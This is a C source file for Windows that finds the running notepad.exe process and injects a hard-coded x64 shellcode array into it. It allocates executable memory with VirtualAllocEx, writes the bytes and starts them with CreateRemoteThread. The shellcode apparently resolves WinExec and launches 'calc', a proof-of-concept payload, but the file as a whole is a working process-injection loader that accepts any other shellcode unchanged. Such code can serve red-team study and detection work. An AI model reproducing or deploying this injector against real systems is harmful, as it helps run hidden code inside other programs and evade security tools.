#include <stdio.h>
#include <Windows.h>
#include <Tlhelp32.h>
#include <TCHAR.h>

DWORD get_pid_byname(const TCHAR* name)
{
	DWORD result = 0;
	PROCESSENTRY32 processEntry32;
	processEntry32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (processSnapshot != INVALID_HANDLE_VALUE) {
		BOOL hasNext = Process32First(processSnapshot, &processEntry32);
		while (hasNext) {
			HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry32.th32ProcessID);
			if (process != NULL) {
				_tprintf(_T("%s\n"), processEntry32.szExeFile);
				if (_tcscmp(processEntry32.szExeFile, name) == 0) {
					result = processEntry32.th32ProcessID;
				}
				CloseHandle(process);
			}
			hasNext = Process32Next(processSnapshot, &processEntry32);
		}
		CloseHandle(processSnapshot);
	}
	return result;
}

int main()
{
	unsigned char ida_chars[] =
	{
		0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61,
		0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B,
		0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48,
		0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57,
		0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48,
		0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
		0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E,
		0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE,
		0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48,
		0x83, 0xC4, 0x68, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
	};
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, get_pid_byname(TEXT("notepad.exe")));
	void* buffer = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, buffer, ida_chars, sizeof(ida_chars), NULL);
	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
	CloseHandle(hProcess);
	return	0;
}